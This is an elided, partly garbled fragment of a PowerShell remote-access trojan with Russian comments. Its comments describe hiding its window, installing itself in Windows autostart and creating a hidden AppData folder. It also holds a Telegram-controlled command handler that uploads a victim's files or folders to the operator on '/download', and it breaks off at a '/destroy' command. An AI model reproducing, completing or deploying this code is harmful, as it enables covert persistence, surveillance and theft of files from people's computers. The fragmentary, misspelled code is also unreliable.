...
# Скрытие окна PowerShell через WScript
...
# Установка в автозагрузку с адаптацией для Windows 10/11
...
if (!(Test-Path $installMarker)) {
    ...
    # Новая скрытая папка в AppData (доступ без прав администратора)
...
/cd [папка] - сменить директорию
/download [файл] - скачать файł или папку
                        ...
                        "^/download (.+)`$" {
                            ...
                            if (Test-Path `$fullPath) {
                                if (Test-Path `$fullPath -PathType Container) {
                                    ...
                                    Send-Telegram "Файł `$target отправлен" `$fullPath
                                }
                            } else {
                                Send-Telegram "Файł/папка не найдены: `$target"
                            }
                        }
                        "^/destroy`$" {
